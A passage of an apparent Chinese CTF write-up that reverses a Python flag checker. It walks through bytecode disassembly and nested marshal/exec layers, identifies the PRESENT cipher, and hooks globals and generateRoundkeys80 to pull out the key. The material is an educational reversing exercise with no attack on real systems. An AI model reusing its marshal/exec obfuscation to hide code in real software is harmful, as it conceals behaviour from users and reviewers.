(43)</span><br><span class="line">            148 LOAD_CONST              53 (59)</span><br><span class="line"></span><br><span class="line">  8         150 LOAD_CONST               0 (12)</span><br><span class="line">            152 LOAD_CONST              54 (28)</span><br><span class="line">            154 LOAD_CONST              55 (44)</span><br><span class="line">            156 LOAD_CONST              56 (60)</span><br><span class="line">            158 LOAD_CONST               7 (13)</span><br><span class="line">            160 LOAD_CONST              57 (29)</span><br><span class="line">            162 LOAD_CONST              58 (45)</span><br><span class="line">            164 LOAD_CONST              59 (61)</span><br><span class="line">            166 LOAD_CONST               9 (14)</span><br><span class="line">            168 LOAD_CONST              60 (30)</span><br><span class="line">            170 LOAD_CONST              61 (46)</span><br><span class="line">            172 LOAD_CONST              62 (62)</span><br><span class="line">            174 LOAD_CONST              10 (15)</span><br><span class="line">            176 LOAD_CONST              63 (31)</span><br><span class="line">            178 LOAD_CONST              64 (47)</span><br><span class="line">            180 LOAD_CONST              65 (63)</span><br><span class="line"></span><br><span class="line">  5         182 BUILD_LIST              64</span><br><span class="line">            184 STORE_NAME               3 (PBox)</span><br><span class="line"></span><br><span class="line">  9         186 LOAD_CONST              66 (&lt;code object &lt;listcomp&gt; at 0x7fbf6f8f8660, file &quot;&quot;, line 9&gt;)</span><br><span class="line">            188 LOAD_CONST              17 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">            190 MAKE_FUNCTION            0</span><br><span class="line">            192 LOAD_NAME                1 (range)</span><br><span class="line">            194 LOAD_CONST              67 (64)</span><br><span class="line">            196 CALL_FUNCTION            1</span><br><span class="line">            198 GET_ITER</span><br><span class="line">            200 CALL_FUNCTION            1</span><br><span class="line">            202 STORE_NAME               4 (PBox_inv)</span><br><span class="line"></span><br><span class="line"> 11         204 LOAD_NAME                5 (marshal)</span><br><span class="line">            206 LOAD_METHOD              6 (loads)</span><br><span class="line">            208 LOAD_CONST              68 (b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01&#x27;)</span><br><span class="line">            210 CALL_METHOD              1</span><br><span class="line">            212 STORE_NAME               7 (co)</span><br><span class="line"></span><br><span class="line"> 12         214 LOAD_NAME                8 (exec)</span><br><span class="line">            216 LOAD_NAME                7 (co)</span><br><span class="line">            218 CALL_FUNCTION            1</span><br><span class="line">            220 POP_TOP</span><br><span class="line">            222 LOAD_CONST              69 (None)</span><br><span class="line">            224 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7fbf6f8f83a0, file &quot;&quot;, line 4&gt;:</span><br><span class="line">  4           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                14 (to 20)</span><br><span class="line">              6 STORE_FAST               1 (x)</span><br><span class="line">              8 LOAD_GLOBAL              0 (Sbox)</span><br><span class="line">             10 LOAD_METHOD              1 (index)</span><br><span class="line">             12 LOAD_FAST                1 (x)</span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 LIST_APPEND              2</span><br><span class="line">             18 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   20 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7fbf6f8f8660, file &quot;&quot;, line 9&gt;:</span><br><span class="line">  9           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                14 (to 20)</span><br><span class="line">              6 STORE_FAST               1 (x)</span><br><span class="line">              8 LOAD_GLOBAL              0 (PBox)</span><br><span class="line">             10 LOAD_METHOD              1 (index)</span><br><span class="line">             12 LOAD_FAST                1 (x)</span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 LIST_APPEND              2</span><br><span class="line">             18 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   20 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</details>

<p>注意到有几个显眼特征:</p>
<ul>
<li>Sbox</li>
<li>PBox</li>
<li>generateRoundkeys80<br>搜索可以得到:</li>
</ul>
<p><img src="https://s2.loli.net/2023/12/03/QR6G7gCuYtfhc1P.png" alt="B68_Z___PC67M0HVVJ2_DA8.png"></p>
<p>说明是present算法<br>那我们怎么得到那几个关键变量的值呢？<br>这里跟着官方WP学习了一手全局hook的思想<br>![&#96;BEPIHG0_C8_CY_@7@6~1L1.png](<a href="https://s2.loli.net/2023/12/03/4wQCeFy9LIT2jms.png">https://s2.loli.net/2023/12/03/4wQCeFy9LIT2jms.png</a>)<br>但是实际用的时候会发现 在exec后用的话 程序会直接退出(调用了exit())<br><img src="https://s2.loli.net/2023/12/03/GPh2KRF5AdOcoBj.png" alt="O_DK_VOF3HP@PW0_O@RGN1Q.png"><br>而我们在exec执行前定义一个exit 相当于把系统的exit给覆盖掉 (利用全局特性 类似web get&#x2F;post修改全局变量)<br>但是这样运行还是报错 我们再加个try except块来保证能得到globals()<br><img src="https://s2.loli.net/2023/12/03/6zMsQ3kjYfnLX52.png" alt="HY65JZD_HH__3_U6_X1YF@L.png"></p>
<p>可以看到这时已经能得到一些关键值了<br>总结一下 : 现在得到了</p>
<ul>
<li>sbox</li>
<li>sbox_inv</li>
<li>pbox</li>
<li>pbox_inv</li>
<li>cmps</li>
</ul>
<p>发现这里还少了 key的值<br>说明key不在globals里 这里再次利用全局hook的技巧<br>key在<code>generateRoundkeys80</code>中被调用</p>
<p><img src="https://s2.loli.net/2023/12/03/1iHt5M7uEXzVw4A.png" alt="img"></p>
<p>所以我们修改generateRoundkeys80 使它输出传入的两个变量的值即可(使用lambda <del>python高级特征学到了</del>)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">generateRoundkeys80 = <span class="keyword">lambda</span> x1,x2: <span class="built_in">print</span>(x1,x2)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/12/03/lEFAxXu9cnajroK.png" alt="_G0380___9__SM1E_1O~LD0.png"><br>这就得到了key!<br>但是直接套会发现解出来不对…<br>那就只能看字节码 手动脱marshal(5,6次吧)<br>得到关键的generatekey80的字节码(最后一层才脱出来 说明关键应该在这里)</p>
<details>
<summary>点击查看代码</summary>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  2           0 LOAD_CONST               0 (&lt;code object generateRoundkeys80 at 0x7fb5577493a0, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;generateRoundkeys80&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (generateRoundkeys80)</span><br><span class="line"></span><br><span class="line"> 11           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">             12 LOAD_CONST                 2           0 LOAD_CONST               0 (&lt;code object encrypt at 0x7f7a22c7c660, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;encrypt&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (encrypt)</span><br><span class="line"></span><br><span class="line"> 16           8 LOAD_NAME                1 (input)</span><br><span class="line">             10 LOAD_CONST               2 (&#x27;pls input ur flag:&#x27;)</span><br><span class="line">             12 CALL_FUNCTION            1</span><br><span class="line">             14 STORE_NAME               2 (inp)</span><br><span class="line"></span><br><span class="line"> 17          16 LOAD_NAME                3 (len)</span><br><span class="line">             18 LOAD_NAME                2 (inp)</span><br><span class="line">             20 CALL_FUNCTION            1</span><br><span class="line">             22 LOAD_CONST               3 (32)</span><br><span class="line">             24 COMPARE_OP               3 (!=)</span><br><span class="line">             26 POP_JUMP_IF_FALSE       44</span><br><span class="line"></span><br><span class="line"> 18          28 LOAD_NAME                4 (print)</span><br><span class="line">             30 LOAD_CONST               4 (&#x27;wrong flag!&#x27;)</span><br><span class="line">             32 CALL_FUNCTION            1</span><br><span class="line">             34 POP_TOP</span><br><span class="line"></span><br><span class="line"> 19          36 LOAD_NAME                5 (exit)</span><br><span class="line">             38 LOAD_CONST               5 (0)</span><br><span class="line">             40 CALL_FUNCTION            1</span><br><span class="line">             42 POP_TOP</span><br><span class="line"></span><br><span class="line"> 20     &gt;&gt;   44 LOAD_NAME                2 (inp)</span><br><span class="line">             46 LOAD_CONST               6 (None)</span><br><span class="line">             48 LOAD_CONST               7 (8)</span><br><span class="line">             50 BUILD_SLICE              2</span><br><span class="line">             52 BINARY_SUBSCR</span><br><span class="line">             54 LOAD_NAME                2 (inp)</span><br><span class="line">             56 LOAD_CONST               7 (8)</span><br><span class="line">             58 LOAD_CONST               8 (16)</span><br><span class="line">             60 BUILD_SLICE              2</span><br><span class="line">             62 BINARY_SUBSCR</span><br><span class="line">             64 LOAD_NAME                2 (inp)</span><br><span class="line">             66 LOAD_CONST               8 (16)</span><br><span class="line">             68 LOAD_CONST               9 (24)</span><br><span class="line">             70 BUILD_SLICE              2</span><br><span class="line">             72 BINARY_SUBSCR</span><br><span class="line">             74 LOAD_NAME                2 (inp)</span><br><span class="line">             76 LOAD_CONST               9 (24)</span><br><span class="line">             78 LOAD_CONST               3 (32)</span><br><span class="line">             80 BUILD_SLICE              2</span><br><span class="line">             82 BINARY_SUBSCR</span><br><span class="line">             84 BUILD_LIST               4</span><br><span class="line">             86 STORE_NAME               6 (blocks)</span><br><span class="line"></span><br><span class="line"> 21          88 LOAD_CONST              10 (120617461261311902)</span><br><span class="line">             90 LOAD_CONST              11 (16357837616839286114)</span><br><span class="line">             92 LOAD_CONST              12 (312508749794633008)</span><br><span class="line">             94 LOAD_CONST              13 (1843701600916795272)</span><br><span class="line">             96 BUILD_LIST               4</span><br><span class="line">             98 STORE_NAME               7 (cmps)</span><br><span class="line"></span><br><span class="line"> 22         100 LOAD_NAME                0 (encrypt)</span><br><span class="line">            102 LOAD_NAME                6 (blocks)</span><br><span class="line">            104 CALL_FUNCTION            1</span><br><span class="line">            106 STORE_NAME               8 (out_blocks)</span><br><span class="line"></span><br><span class="line"> 23         108 LOAD_NAME                9 (range)</span><br><span class="line">            110 LOAD_CONST              14 (4)</span><br><span class="line">            112 CALL_FUNCTION            1</span><br><span class="line">            114 GET_ITER</span><br><span class="line">        &gt;&gt;  116 FOR_ITER                36 (to 154)</span><br><span class="line">            118 STORE_NAME              10 (i)</span><br><span class="line"></span><br><span class="line"> 24         120 LOAD_NAME                7 (cmps)</span><br><span class="line">            122 LOAD_NAME               10 (i)</span><br><span class="line">            124 BINARY_SUBSCR</span><br><span class="line">            126 LOAD_NAME                8 (out_blocks)</span><br><span class="line">            128 LOAD_NAME               10 (i)</span><br><span class="line">            130 BINARY_SUBSCR</span><br><span class="line">            132 COMPARE_OP               3 (!=)</span><br><span class="line">            134 POP_JUMP_IF_FALSE      116</span><br><span class="line"></span><br><span class="line"> 25         136 LOAD_NAME                4 (print)</span><br><span class="line">            138 LOAD_CONST               4 (&#x27;wrong flag!&#x27;)</span><br><span class="line">            140 CALL_FUNCTION            1</span><br><span class="line">            142 POP_TOP</span><br><span class="line"></span><br><span class="line"> 26         144 LOAD_NAME                5 (exit)</span><br><span class="line">            146 LOAD_CONST               5 (0)</span><br><span class="line">            148 CALL_FUNCTION            1</span><br><span class="line">            150 POP_TOP</span><br><span class="line">            152 JUMP_ABSOLUTE          116</span><br><span class="line"></span><br><span class="line"> 27     &gt;&gt;  154 LOAD_NAME                4 (print)</span><br><span class="line">            156 LOAD_CONST              15 (&#x27;Correct!&#x27;)</span><br><span class="line">            158 CALL_FUNCTION            1</span><br><span class="line">            160 POP_TOP</span><br><span class="line">            162 LOAD_CONST               6 (None)</span><br><span class="line">            164 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object encrypt at 0x7f7a22c7c660, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_CONST               1 (32)</span><br><span class="line">              2 STORE_FAST               1 (rounds)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (generateRoundkeys80)</span><br><span class="line">              6 LOAD_CONST               2 (85354531916197809168417)</span><br><span class="line">              8 LOAD_FAST                1 (rounds)</span><br><span class="line">             10 CALL_FUNCTION            2</span><br><span class="line">             12 STORE_FAST               2 (roundkeys)</span><br><span class="line"></span><br><span class="line">  5          14 BUILD_LIST               0</span><br><span class="line">             16 STORE_FAST               3 (out)</span><br><span class="line"></span><br><span class="line">  6          18 LOAD_FAST                0 (blocks)</span><br><span class="line">             20 GET_ITER</span><br><span class="line">        &gt;&gt;   22 FOR_ITER                84 (to 108)</span><br><span class="line">             24 STORE_FAST               4 (block)</span><br><span class="line"></span><br><span class="line">  7          26 LOAD_GLOBAL              1 (string2number)</span><br><span class="line">             28 LOAD_FAST                4 (block)</span><br><span class="line">             30 CALL_FUNCTION            1</span><br><span class="line">             32 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line">  8          34 LOAD_GLOBAL              2 (range)</span><br><span class="line">             36 LOAD_FAST                1 (rounds)</span><br><span class="line">             38 LOAD_CONST               3 (1)</span><br><span class="line">             40 BINARY_SUBTRACT</span><br><span class="line">             42 CALL_FUNCTION            1</span><br><span class="line">             44 GET_ITER</span><br><span class="line">        &gt;&gt;   46 FOR_ITER                34 (to 82)</span><br><span class="line">             48 STORE_FAST               6 (i)</span><br><span class="line"></span><br><span class="line">  9          50 LOAD_GLOBAL              3 (addRoundKey)</span><br><span class="line">             52 LOAD_FAST                5 (state)</span><br><span class="line">             54 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             56 LOAD_FAST                6 (i)</span><br><span class="line">             58 BINARY_SUBSCR</span><br><span class="line">             60 CALL_FUNCTION            2</span><br><span class="line">             62 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line"> 10          64 LOAD_GLOBAL              4 (sBoxLayer)</span><br><span class="line">             66 LOAD_FAST                5 (state)</span><br><span class="line">             68 CALL_FUNCTION            1</span><br><span class="line">             70 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line"> 11          72 LOAD_GLOBAL              5 (pLayer)</span><br><span class="line">             74 LOAD_FAST                5 (state)</span><br><span class="line">             76 CALL_FUNCTION            1</span><br><span class="line">             78 STORE_FAST               5 (state)</span><br><span class="line">             80 JUMP_ABSOLUTE           46</span><br><span class="line"></span><br><span class="line"> 12     &gt;&gt;   82 LOAD_GLOBAL              3 (addRoundKey)</span><br><span class="line">             84 LOAD_FAST                5 (state)</span><br><span class="line">             86 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             88 LOAD_CONST               4 (-1)</span><br><span class="line">             90 BINARY_SUBSCR</span><br><span class="line">             92 CALL_FUNCTION            2</span><br><span class="line">             94 STORE_FAST               7 (cipher)</span><br><span class="line"></span><br><span class="line"> 13          96 LOAD_FAST                3 (out)</span><br><span class="line">             98 LOAD_METHOD              6 (append)</span><br><span class="line">            100 LOAD_FAST                7 (cipher)</span><br><span class="line">            102 CALL_METHOD              1</span><br><span class="line">            104 POP_TOP</span><br><span class="line">            106 JUMP_ABSOLUTE           22</span><br><span class="line"></span><br><span class="line"> 14     &gt;&gt;  108 LOAD_FAST                3 (out)</span><br><span class="line">            110 RETURN_VALUE</span><br><span class="line">None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line"> 12          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object generateRoundkeys80 at 0x7fb5577493a0, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 BUILD_LIST               0</span><br><span class="line">              2 STORE_FAST               2 (roundkeys)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (range)</span><br><span class="line">              6 LOAD_CONST               1 (1)</span><br><span class="line">              8 LOAD_FAST                1 (rounds)</span><br><span class="line">             10 LOAD_CONST               1 (1)</span><br><span class="line">             12 BINARY_ADD</span><br><span class="line">             14 LOAD_CONST               1 (1)</span><br><span class="line">             16 CALL_FUNCTION            3</span><br><span class="line">             18 GET_ITER</span><br><span class="line">        &gt;&gt;   20 FOR_ITER                90 (to 112)</span><br><span class="line">             22 STORE_FAST               3 (i)</span><br><span class="line"></span><br><span class="line">  5          24 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             26 LOAD_METHOD              1 (append)</span><br><span class="line">             28 LOAD_FAST                0 (key)</span><br><span class="line">             30 LOAD_CONST               2 (16)</span><br><span class="line">             32 BINARY_RSHIFT</span><br><span class="line">             34 CALL_METHOD              1</span><br><span class="line">             36 POP_TOP</span><br><span class="line"></span><br><span class="line">  6          38 LOAD_FAST                0 (key)</span><br><span class="line">             40 LOAD_CONST               3 (524287)</span><br><span class="line">             42 BINARY_AND</span><br><span class="line">             44 LOAD_CONST               4 (61)</span><br><span class="line">             46 BINARY_LSHIFT</span><br><span class="line">             48 LOAD_FAST                0 (key)</span><br><span class="line">             50 LOAD_CONST               5 (19)</span><br><span class="line">             52 BINARY_RSHIFT</span><br><span class="line">             54 BINARY_ADD</span><br><span class="line">             56 STORE_FAST               0 (key)</span><br><span class="line"></span><br><span class="line">  7          58 LOAD_GLOBAL              2 (Sbox)</span><br><span class="line">             60 LOAD_FAST                0 (key)</span><br><span class="line">             62 LOAD_CONST               6 (76)</span><br><span class="line">             64 BINARY_RSHIFT</span><br><span class="line">             66 BINARY_SUBSCR</span><br><span class="line">             68 LOAD_CONST               6 (76)</span><br><span class="line">             70 BINARY_LSHIFT</span><br><span class="line">             72 LOAD_FAST                0 (key)</span><br><span class="line">             74 LOAD_CONST               7 (2)</span><br><span class="line">             76 LOAD_CONST               6 (76)</span><br><span class="line">             78 BINARY_POWER</span><br><span class="line">             80 LOAD_CONST               1 (1)</span><br><span class="line">             82 BINARY_SUBTRACT</span><br><span class="line">             84 BINARY_AND</span><br><span class="line">             86 BINARY_ADD</span><br><span class="line">             88 STORE_FAST               0 (key)</span><br><span class="line"></span><br><span class="line">  8          90 LOAD_FAST                0 (key)</span><br><span class="line">             92 LOAD_FAST                3 (i)</span><br><span class="line">             94 LOAD_CONST               8 (15)</span><br><span class="line">             